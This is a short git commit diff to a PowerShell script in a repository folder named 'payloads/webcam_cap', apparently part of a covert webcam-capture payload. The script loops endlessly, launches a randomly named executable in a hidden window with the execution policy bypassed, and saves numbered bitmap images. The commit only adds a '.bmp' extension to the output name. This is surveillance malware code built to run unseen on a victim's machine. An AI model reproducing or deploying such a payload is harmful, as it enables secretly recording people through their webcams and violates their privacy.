83787e631f2488b25189e515f2d63ca6daa5a1c4
Soumyo001 <www.soumyo@gmail.com>
2025-01-29 19:53:18 +0600

    test webcam(2)

--- payloads/webcam_cap/webcam.ps1
+++ payloads/webcam_cap/webcam.ps1
@@ -2,7 +2,7 @@ $count=0
 $curr_dir=(Get-Location).Path
 while($true){
     powershell -noP -ep bypass -w hidden Start-Process powershell.exe -windowstyle hidden "$curr_dir\KJUwHZlCNV.exe"
-    $file_name="TmreCWpLEnhx$count"
+    $file_name="TmreCWpLEnhx$count.bmp"
     while(Test-Path -Path "$curr_dir\$file_name"){
         $count++
     }
